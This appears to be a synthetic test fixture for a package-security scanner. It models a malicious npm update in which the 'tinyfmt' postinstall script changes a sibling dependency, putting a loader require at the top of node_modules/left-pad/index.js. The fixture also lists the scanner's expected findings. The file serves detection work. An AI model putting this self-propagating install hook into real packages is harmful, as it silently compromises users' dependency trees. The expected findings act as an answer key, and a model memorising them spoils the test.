@@ -1,0 +1,58 @@
+{
+  "id": "install-root-sibling-package-write",
+  "title": "Postinstall hook prepends a loader to a sibling package through a wrapper",
+  "category": "install-time-self-propagation",
+  "verdict": "malicious",
+  "threatClass": "self-propagating-worm",
+  "source": "synthetic",
+  "intent": "Model local propagation that hides the install-root path behind a multi-line path.join alias and a helper whose parameter receives it at the call site, so only following the path into the write destination connects node_modules to the write. Inert fixture; the target is a fixture path, not a real tree.",
+  "previousPackageJson": {
+    "name": "tinyfmt",
+    "version": "2.3.0"
+  },
+  "stagedPackageJson": {
+    "name": "tinyfmt",
+    "version": "2.3.1",
+    "scripts": {
+      "postinstall": "node install.js"
+    }
+  },
+  "previousFiles": [
+    {
+      "path": "package.json",
+      "size": 35,
+      "sha256": "prev-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"tinyfmt\",\"version\":\"2.3.0\"}"
+    }
+  ],
+  "stagedFiles": [
+    {
+      "path": "package.json",
+      "size": 79,
+      "sha256": "staged-package-json",
+      "flags": [],
+      "textSample": "{\"name\":\"tinyfmt\",\"version\":\"2.3.1\",\"scripts\":{\"postinstall\":\"node install.js\"}}"
+    },
+    {
+      "path": "install.js",
+      "size": 420,
+      "sha256": "install-js",
+      "flags": [],
+      "textSample": "const fs = require('node:fs');\nconst path = require('node:path');\n// Prepend our loader to a dependency the consumer already trusts.\nconst modulesDir = path.join(\n  process.cwd(),\n  'node_modules'\n);\nfunction plant(target) {\n  const entry = path.join(target, 'index.js');\n  const original = fs.readFileSync(entry, 'utf8');\n  fs.writeFileSync(entry, \"require('tinyfmt/loader');\\n\" + original);\n}\nplant(path.join(modulesDir, 'left-pad'));\n"
+    }
+  ],
+  "expectedRisk": "high",
+  "expectedFindings": [
+    {
+      "ruleId": "install-script.lifecycle",
+      "severity": "high",
+      "file": "package.json"
+    },
+    {
+      "ruleId": "propagation.package-mutation",
+      "severity": "high",
+      "file": "install.js"
+    }
+  ]
+}
